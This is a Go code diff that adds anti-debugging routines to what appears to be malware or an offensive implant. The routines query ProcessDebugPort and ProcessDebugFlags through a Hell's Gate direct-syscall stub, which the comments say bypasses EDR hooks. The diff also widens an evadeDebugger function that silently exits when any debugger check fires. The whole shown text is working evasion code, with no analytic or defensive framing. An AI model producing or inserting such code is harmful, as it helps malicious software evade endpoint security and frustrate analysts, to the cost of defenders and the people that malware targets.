@@ -82,9 +82,63 @@ func timingCheck() bool {
 	return elapsed > 500*time.Millisecond
 }
 
+// ntQueryDebugPort checks ProcessDebugPort (class 7) via NtQueryInformationProcess
+// using a Hell's Gate stub — bypasses any EDR hook on the Win32 API layer.
+func ntQueryDebugPort() bool {
+	proc := NewHGProc("NtQueryInformationProcess")
+	if proc == nil {
+		return false
+	}
+	hProc, _, _ := procGetCurrentProcess.Call()
+	if hProc == 0 {
+		return false
+	}
+	var debugPort uintptr
+	const ProcessDebugPort = 7
+	r1, _, _ := proc.Call(
+		hProc,
+		uintptr(ProcessDebugPort),
+		uintptr(unsafe.Pointer(&debugPort)),
+		unsafe.Sizeof(debugPort),
+		0,
+	)
+	// NTSTATUS 0 = success; non-zero debugPort means debugger attached
+	return r1 == 0 && debugPort != 0
+}
+
+// ntQueryNoDebugInherit checks ProcessDebugFlags (class 0x1F): returns 0 when
+// the process was created with DEBUG_ONLY_THIS_PROCESS / inherits a debugger.
+func ntQueryNoDebugInherit() bool {
+	proc := NewHGProc("NtQueryInformationProcess")
+	if proc == nil {
+		return false
+	}
+	hProc, _, _ := procGetCurrentProcess.Call()
+	if hProc == 0 {
+		return false
+	}
+	var flags uint32 = 1 // assume no-inherit by default
+	const ProcessDebugFlags = 0x1F
+	r1, _, _ := proc.Call(
+		hProc,
+		uintptr(ProcessDebugFlags),
+		uintptr(unsafe.Pointer(&flags)),
+		unsafe.Sizeof(flags),
+		0,
+	)
+	// flags == 0 means EPROCESS.NoDebugInherit is clear → debugger present
+	return r1 == 0 && flags == 0
+}
+
 // evadeDebugger exits silently if a debugger is detected via any method.
 func evadeDebugger() {
-	if isDebuggerPresentWin() || isRemoteDebuggerPresent() || isDebuggerProcessRunning() || timingCheck() {
+	if isDebuggerPresentWin() ||
+		isRemoteDebuggerPresent() ||
+		isDebuggerProcessRunning() ||
+		timingCheck() ||
+		rdtscTimingCheck() ||
+		ntQueryDebugPort() ||
+		ntQueryNoDebugInherit() {
 		os.Exit(0)
 	}
 }
